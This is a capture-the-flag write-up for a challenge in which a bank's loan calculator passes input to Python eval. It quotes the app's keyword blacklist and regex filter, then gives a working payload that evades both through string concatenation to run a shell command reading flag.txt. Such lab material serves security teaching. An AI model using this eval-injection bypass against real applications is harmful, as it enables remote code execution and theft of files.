# TITLE : 3v@l
## Author : Theoneste Byagutangaza
## Description
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?
## Hints
- Bypass regex
- The flag file is /flag.txt
- You might need encoding or dynamic construction to bypass restrictions.
## Solution
In this challenge, we are given a bank loan calculator that uses Python’s eval function to perform calculations. According to the description, this makes the application vulnerable because eval executes any string as Python code.

From the source code, we see that the developer attempted to secure it by implementing two protections:
1. Blacklist of malicious keywords:
```
os, eval, exec, bind, connect, python, socket, ls, cat, shell, bind
```
2. Regex-based filtering
```
r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```
However, as the challenge hint suggests, this can be bypassed using dynamic string construction and encoding tricks. For example:  
If we try:
```python
__import__('os').popen('cat').read()
```
it will be blocked because the string contains the blacklisted keywords os and cat.  
But if we dynamically construct the strings:
```python
__import__('o'+'s').popen('c'+'a'+'t').read()
```
the filter will not match them, because the forbidden words are not present as literal substrings — they are built at runtime.
To read the flag, we can combine directory traversal (..) and file reading. Since the regex blocks literal .. and .txt, we can bypass them by concatenating the dots and letters separately:  
**Final payload:**
```python
__import__('o'+'s').popen(
    'c'+'d'+' '+'.'+'.'+';'+'c'+'a'+'t'+' '+'f'+'l'+'a'+'g'+'.'+'t'+'x'+'t'
).read()
```
When executed, this payload changes directory to the parent folder and then reads the contents of flag.txt, revealing the flag.


